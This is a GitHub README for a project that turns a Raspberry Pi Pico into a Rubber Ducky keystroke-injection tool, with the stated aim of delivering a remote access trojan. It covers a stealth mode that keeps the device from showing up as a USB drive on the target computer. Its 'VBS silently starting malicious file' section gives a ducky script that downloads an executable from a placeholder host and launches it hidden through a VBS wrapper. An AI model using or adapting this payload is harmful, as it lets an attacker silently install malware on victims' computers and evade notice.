<hr>


<h3 align="center">
<p align="center">
<img src="https://cdn-media-1.freecodecamp.org/images/1*ylvkldd2jkFaSSpn8MdVTQ.png" width="" height="200" />
</p>

  Raspberry Pi-Pico as Rubber Ducky<br><br>
  <a href="#">
      <img src="https://img.shields.io/badge/License-GPLv3-blue.svg" alt="pico" height=24 title="pico">
    <img src="https://awesome.re/badge.svg" alt="Awesome" height=24>
    <img src="https://img.shields.io/github/contributors/nzkoxzu/pi-pico-rubber-ducky.svg?style=plastic&logo=appveyor&logo=appveyor&color=success" alt="pico" height=24>
            <img src="https://img.shields.io/github/forks/nzkoxzu/pi-pico-rubber-ducky.svg?style=plastic&logo=appveyor&logo=appveyor&color=red" alt="pico" height=24>
    <img src="https://img.shields.io/github/issues/nzkoxzu/pi-pico-rubber-ducky.svg?style=plastic&logo=appveyor&logo=appveyor&color=orange" alt="pico" height=24>
  </a>
  
  
  
  
</h3>

# pi-pico-rubber-ducky

Aim is to run a R.A.T payload btw of a Raspberry Pi-Pico (rp2040) running ducky scripts. Part of : https://github.com/Denis-REMACLE/K-ptain.Ratz


### Using

1. To use this repo please download first the [Circuitpython .uf2 file](https://circuitpython.org/board/raspberry_pi_pico/) 
2. Plug the device into a USB port while holding the boot button. It will show up as a removable media device named `RPI-RP2`.
3. Jsut drag and drop the `.uf2` file into the root directory of the Pi Pico. The device will now reboot as `CIRCUITPY`.  
4. Download and copy the repo content to the Pico :
```sh
git clone https://github.com/nzkoxzu/pi-pico-rubber-ducky.git
```
```sh
cp -r pi-pico-rubber-ducky/* /media/username/CIRCUITPY/
```
5. [Create your own ducky script](https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Duckyscript) and save it as `payload.dd` in the Pico.
6. Careful, if your device isn't in setup mode, the device will reboot and after half a second, the ducky script will run.


# Setup mode

To edit the payload, enter setup mode by connecting the pin 1 (`GP0`) to pin 3 (`GND`), this will stop the pico-ducky from injecting the payload in your own machine. The easiest way to so is by using a jumper wire between those pins as seen bellow.

![setup-mode](https://raw.githubusercontent.com/nzkoxzu/pi-pico-rubber-ducky/main/images/setup-mode.png)

# USB enable/disable mode

If you need the pico-ducky to not show up as a USB mass storage device for stealth, follow these instructions.
1. Enter setup mode.
2. Copy `boot.py` to the root of the pico-ducky.
Copy your `payload.dd` script to the pico-ducky.
Disconnect the pico from your host PC. Connect a jumper wire between pin 18 (`GND`) and pin 20 (`GPIO15`). This will prevent the pico-ducky from showing up as a USB drive when plugged into the target computer.
Remove the jumper and reconnect to your PC to reprogram. The default mode is USB mass storage enabled.

![usb-boot-mode](https://raw.githubusercontent.com/nzkoxzu/pi-pico-rubber-ducky/main/images/usb-boot-mode.png)

# VBS silently starting malicious file 

For Windows, if you want to silently run `.exe` files you can run them with VBS. Your `payload.dd` should looks like this :

```dd
STRING curl.exe --output not_malicious_file.exe --url https://youwebsite.example/ressources/not_malicious_file.exe
ENTER
DELAY 1000
STRING curl.exe --output starter.vbs --url https://youwebsite.example/ressources/starter.vbs
ENTER
DELAY 1000
STRING wscript starter.vbs
ENTER
```
This will download `not_malicious_file.exe` and `starter.vbs`. The `starter.vbs` looks like this :

```vbs
Dim WShell
Set WShell = CreateObject("WScript.Shell")
WShell.Run "not_malicious_file.exe", 0
Set WShell = Nothing
```
This VBS file will launch `not_malicious_file.exe` and the `, 0` statement enable silent run.


# Changing Keyboard layouts
Copied from [Neradoc/Circuitpython_Keyboard_Layouts](https://github.com/Neradoc/Circuitpython_Keyboard_Layouts/blob/main/PICODUCKY.md)  

#### How to use one of these layouts with the pico-ducky repository.

**Go to the [latest release page](https://github.com/Neradoc/Circuitpython_Keyboard_Layouts/releases/latest), look if your language is in the list.**

#### If your language/layout is in the bundle

Download the `py` zip, named `circuitpython-keyboard-layouts-py-XXXXXXXX.zip`

**NOTE: You can use the mpy version targetting the version of Circuitpython that is on the device, but on Raspberry Pi Pico you don't need it - they only reduce file size and memory use on load, which the pico has plenty of.**

#### If your language/layout is not in the bundle

Try the online generator, it should get you a zip file with the bundles for yout language

https://www.neradoc.me/layouts/

#### Now you have a zip file

#### Find your language/layout in the lib directory

For a language `LANG`, copy the following files from the zip's `lib` folder to the `lib` directory of the board.  
**DO NOT** modify the adafruit_hid directory. Your files go directly in `lib`.  
**DO NOT** change the names or extensions of the files. Just pick the right ones.  
Replace `LANG` with the letters for your language of choice.

- `keyboard_layout_win_LANG.py`
- `keycode_win_LANG.py`

Don't forget to get [the adafruit_hid library](https://github.com/adafruit/Adafruit_CircuitPython_HID/releases/latest).

This is what it should look like **if your language is French for example**.

![CIRCUITPY drive screenshot](https://github.com/Neradoc/Circuitpython_Keyboard_Layouts/raw/main/docs/drive_pico_ducky.png)

#### Modify the pico-ducky code to use your language file:

At the start of the file comment out these lines:

```py
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS as KeyboardLayout
from adafruit_hid.keycode import Keycode
```

Uncomment these lines:  
*Replace `LANG` with the letters for your language of choice. The name must match the file (without the py or mpy extension).*
```py
from keyboard_layout_win_LANG import KeyboardLayout
from keycode_win_LANG import Keycode
```

##### Example:  Set to German Keyboard (WIN_DE)

```py
from keyboard_layout_win_de import KeyboardLayout
from keycode_win_de import Keycode
```

Copy the files keyboard_layout_win_de.mpy and keycode_win_de.mpy to the /lib folder on the Pico board
```
adafruit_hid/
keyboard_layout_win_de.mpy
keycode_win_de.mpy
```
<p align="right">(<a href="#top">back to top</a>)</p>


